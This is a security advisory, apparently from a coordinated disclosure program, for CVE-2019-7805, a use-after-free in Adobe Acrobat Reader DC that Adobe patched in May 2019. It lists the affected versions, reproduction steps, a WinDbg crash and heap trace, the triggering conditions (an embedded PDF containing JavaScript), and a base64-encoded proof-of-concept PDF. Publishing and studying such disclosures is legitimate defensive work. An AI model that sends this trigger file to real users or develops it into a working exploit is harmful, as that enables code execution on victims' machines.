**Vulnerability Summary**<br>
A use-after-free vulnerability exists in Adobe Acrobat Reader DC, which allows attackers execute arbitrary code with the privileges of the current user.

**CVE**<br>
CVE-2019-7805

**Credit**<br>
An independent Security Researcher has reported this vulnerability to SSD Secure Disclosure program.

**Affected systems**<br>

<table border="1" width="100%" cellspacing="0" cellpadding="1">
<tbody>
<tr>
<th><b>Product</b></th>
<th><b>Track</b></th>
<th><b>Affected Versions</b></th>
<th><b>Platform</b></th>
</tr>
<tr>
<td>Acrobat DC</td>
<td>Continuous</td>
<td>2019.010.20100 and earlier versions</td>
<td>Windows and macOS</td>
</tr>
<tr>
<td>Acrobat Reader DC</td>
<td>Continuous</td>
<td>2019.010.20099 and earlier versions</td>
<td>Windows and macOS</td>
</tr>
<tr>
<td> </td>
<td> </td>
<td> </td>
<td> </td>
</tr>
<tr>
<td>Acrobat 2017</td>
<td>Classic 2017</td>
<td>2017.011.30140 and earlier version</td>
<td>Windows and macOS</td>
</tr>
<tr>
<td>Acrobat Reader 2017</td>
<td>Classic 2017</td>
<td>2017.011.30138 and earlier version</td>
<td>Windows and macOS</td>
</tr>
<tr>
<td> </td>
<td> </td>
<td> </td>
<td> </td>
</tr>
<tr>
<td>Acrobat DC</td>
<td>Classic 2015</td>
<td>2015.006.30495 and earlier versions</td>
<td>Windows and macOS</td>
</tr>
<tr>
<td>Acrobat Reader DC</td>
<td>Classic 2015</td>
<td>2015.006.30493 and earlier versions</td>
<td>Windows and macOS</td>
</tr>
</tbody>
</table>

**Vendor Response**<br>
Adobe fixed this vulnerability and released a public security advisory in May 14, 2019. Adobe Advisory

**Vulnerability Details**<br>
How to reproduce:
1. Set Paged Heap on for the “AcrodRD32.exe”
2. Open the attached “poc.pdf”, and you will see the crash.

Using WinDbg, we will see the following crash analysis. The test was done on Windows 10. Don’t forget to set Paged Heap on for the “AcroRd32.exe”.

**Crash info**<br>
```
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.dll -
*** WARNING: Unable to verify checksum for C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\plug_ins\Annots.api
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\plug_ins\Annots.api -
eax=00000000 ebx=3541efd8 ecx=15b2adc0 edx=3540cfe8 esi=00000000 edi=1e178bd8
eip=68406302 esp=00efeba0 ebp=00efeba0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
AcroRd32!CTJPEGWriter::CTJPEGWriter+0x8235f:
68406302 66398100010000  cmp     word ptr [ecx+100h],ax   ds:002b:15b2aec0=????
1:012> kv
 # ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
00 00efeba0 66aea056 15b2adc0 c3ad4164 1e178bd8 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x8235f
01 00efec08 66aea024 00000001 3542cfb8 3542cf90 Annots!PlugInMain+0x3780e
02 00efec28 66ae9c12 297aefe8 00efec78 68380dfe Annots!PlugInMain+0x377dc
03 00efec34 68380dfe 3540aff0 1df3c3db 2803cff8 Annots!PlugInMain+0x373ca
04 00efec78 683808ed 3542cfb8 1df3c34b 0000011c AcroRd32!DllCanUnloadNow+0x1f5d4
05 00efece8 6838069f 1df3c2b3 00000113 0b518fd8 AcroRd32!DllCanUnloadNow+0x1f0c3
06 00efed10 68321267 000004d3 00000000 00000113 AcroRd32!DllCanUnloadNow+0x1ee75
07 00efed2c 7761bf1b 001205da 00000113 000004d3 AcroRd32!AcroWinMainSandbox+0x77f1
08 00efed58 776183ea 68320d1c 001205da 00000113 USER32!_InternalCallWinProc+0x2b
09 00efee40 77617c9e 68320d1c 00000000 00000113 USER32!UserCallWinProcCheckWow+0x3aa (FPO: [SEH])
0a 00efeebc 77617a80 adba9dc5 00eff154 6837ffca USER32!DispatchMessageWorker+0x20e (FPO: [Non-Fpo])
0b 00efeec8 6837ffca 00efeef4 1df3def7 00000001 USER32!DispatchMessageW+0x10 (FPO: [Non-Fpo])
0c 00eff154 6837fd92 1df3de2f 00000001 0b3f6de0 AcroRd32!DllCanUnloadNow+0x1e7a0
0d 00eff18c 6831a359 1df3de5b 0b206fa0 00eff6cc AcroRd32!DllCanUnloadNow+0x1e568
0e 00eff1f8 68319c2d 682f0000 00390000 0b206fa0 AcroRd32!AcroWinMainSandbox+0x8e3
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for AcroRd32.exe -
0f 00eff614 00397319 682f0000 00390000 0b206fa0 AcroRd32!AcroWinMainSandbox+0x1b7
10 00eff9dc 0049889a 00390000 00000000 0486a0d4 AcroRd32_exe+0x7319
11 00effa28 76418484 00c1a000 76418460 1545a828 AcroRd32_exe!AcroRd32IsBrokerProcess+0x908ba
12 00effa3c 77ae302c 00c1a000 1ed50fae 00000000 KERNEL32!BaseThreadInitThunk+0x24 (FPO: [Non-Fpo])
13 00effa84 77ae2ffa ffffffff 77afec59 00000000 ntdll!__RtlUserThreadStart+0x2f (FPO: [SEH])
14 00effa94 00000000 00391367 00c1a000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
1:012> !heap -p -a ecx
    address 15b2adc0 found in
    _DPH_HEAP_ROOT @ 4851000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                   15ae1e38:         15b2a000             2000
    6a2bae02 verifier!AVrfDebugPageHeapFree+0x000000c2
    77b62fa1 ntdll!RtlDebugFreeHeap+0x0000003e
    77ac2735 ntdll!RtlpFreeHeap+0x000000d5
    77ac2302 ntdll!RtlFreeHeap+0x00000222
    7789e13b ucrtbase!_free_base+0x0000001b
    7789e108 ucrtbase!free+0x00000018
    6833f927 AcroRd32!CTJPEGLibInit+0x00003a77
    683de9cd AcroRd32!CTJPEGWriter::CTJPEGWriter+0x0005aa2a
    683ca751 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x000467ae
    683ca1f7 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x00046254
    6845e886 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x000da8e3
    6845c847 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x000d88a4
    6845c7b5 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x000d8812
    6845c6d0 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x000d872d
    684a4526 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x00120583
    6845752c AcroRd32!CTJPEGWriter::CTJPEGWriter+0x000d3589
    684c1dc1 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x0013de1e
    684abd11 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x00127d6e
    684a705a AcroRd32!CTJPEGWriter::CTJPEGWriter+0x001230b7
    684a6a0d AcroRd32!CTJPEGWriter::CTJPEGWriter+0x00122a6a
    684a64b4 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x00122511
    684ab857 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x001278b4
    684aa2d7 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x00126334
    684a6ac7 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x00122b24
    684a64b4 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x00122511
    684ab857 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x001278b4
    684aa2d7 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x00126334
    684a6ac7 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x00122b24
    684a64b4 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x00122511
    684ab857 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x001278b4
    684aa2d7 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x00126334
    684a6ac7 AcroRd32!CTJPEGWriter::CTJPEGWriter+0x00122b24
```

ECX register is pointing to a freed memory. It is clear that this is a use-after-free condition.

If you will analyze the “poc.pdf”, several conditions must be met in order to reproduce this crash.

1. A pdf embedding another pdf, when opening the main pdf, the embedded pdf is opened.
2. The embedded pdf should contain JavaScript part. Any JavaScript is enough to trigger the crash.

It seems that as long as the above conditions meet, the PoC will succeed.

The attacker can run JavaScript code in the embedded pdf in order to exploit this use-after-free vulnerability.

**PoC**<br>
The poc.pdf file contains binary data, so we will encode it in base64.
```
JVBERi0xLjcNCjEgMCBvYmoNCjw8IC9UeXBlIC9DYXRhbG9nDQovUGFnZXMgMi
AwIFINCi9OYW1lcyA8PCAvRW1iZWRkZWRGaWxlcyA8PCAvTmFtZXMgWyA8Njc2ZjJlNzA2NDY2P
iA1IDAgUiBdDSA+Pg0gPj4NID4+DQplbmRvYmoNCg0KMiAwIG9iag0KPDwgL0tpZHMgWyAzIDAg
UiBdDQovVHlwZSAvUGFnZXMNCi9Db3VudCAxDSA+Pg0KZW5kb2JqDQoNCjMgMCBvYmoNCjw8IC9
QYXJlbnQgMiAwIFINCi9Db250ZW50cyA2IDAgUg0KL1Jlc291cmNlcyA8PCA+Pg0KL0FBIDw8IC
9PIDcgMCBSDSA+Pg0KL01lZGlhQm94IFsgMCAwIDYwMCA4MDAgXQ0KL1R5cGUgL1BhZ2UNID4+D
QplbmRvYmoNCg0KNCAwIG9iag0KPDwgL0xlbmd0aCAzNTANCi9UeXBlIC9FbWJlZGRlZEZpbGUN
Ci9GaWx0ZXIgL0ZsYXRlRGVjb2RlDQovUGFyYW1zIDw8IC9TaXplIDYxOQ0KL0NoZWNrc3VtIDw
5OGE2ZWJhZjcxOTZhNTMzNzQxMmE0NzU1OTE4NjgxMz4NID4+DQovU3VidHlwZSAvYXBwbGljYX
Rpb24jMkZwZGYNID4+DQpzdHJlYW0NCnicbZI7TsNAEIYRBYWlbTjBNKl4+G0SKYoECRFKQInsU
KEUiz0JRsYbrRcUOAunQFRUnIMTUHEAGhjbCo5ibNnS/Dvzzfy72xj3+gfm4RHTGu8/X99vH0wz
wQBxfcu0dhv0yeMCQe9yxRMxZ5o+5nPMwKIUn6LRAtPjUMUiBaeQoNNhGqZRUc80ax01jKMMrsD
OE2FK1SW7IFLUFfepAnMTYa8jxlwiJa3aVwAKfMzEvQxpOsrMGfoFRjE/EUtqatDrGQY06Ztutn
DqhktTxAhAH/AHHoQyXiiKBwG4/zl11xnnmM7VDZhNKujHiUIJej/hCnsYigjL2kxJ5HdMWz7vD
ff9s9fLweRlZ2sXtj8L7mq5arGUOGMa+aDf3wOe69ouzCrNbEG5klZay6lppmfWNMszapptNStN
SR4nKEuXQfyE+TC6LwQdXLUrmeJSldM6Vn6zGqej/i+EoJlTDQplbmRzdHJlYW0NCmVuZG9iag0
KDQo1IDAgb2JqDQo8PCAvRiAoZ28ucGRmKQ0KL1R5cGUgL0ZpbGVzcGVjDQovRUYgPDwgL0YgNC
AwIFINID4+DSA+Pg0KZW5kb2JqDQoNCjYgMCBvYmoNCjw8IC9MZW5ndGggMA0gPj4NCnN0cmVhb
Q0KDQplbmRzdHJlYW0NCmVuZG9iag0KDQo3IDAgb2JqDQo8PCAvTmV3V2luZG93IGZhbHNlDQov
VCA8PCAvTiA8Njc2ZjJlNzA2NDY2Pg0KL1IgL0MNID4+DQovUyAvR29Ub0UNID4+DQplbmRvYmo
NCg0KeHJlZg0KMCA4DQowMDAwMDAwMDAwIDY1NTM1IGYNCjAwMDAwMDAwMTAgMDAwMDAgbg0KMD
AwMDAwMDEzNSAwMDAwMCBuDQowMDAwMDAwMjAyIDAwMDAwIG4NCjAwMDAwMDAzMzkgMDAwMDAgb
g0KMDAwMDAwMDg5MyAwMDAwMCBuDQowMDAwMDAwOTcwIDAwMDAwIG4NCjAwMDAwMDEwMjggMDAw
MDAgbg0KdHJhaWxlcg0KPDwgL1NpemUgOA0KL1Jvb3QgMSAwIFINID4+DQpzdGFydHhyZWYNCjE
xMTkNCiUlRU9GDQo=
```
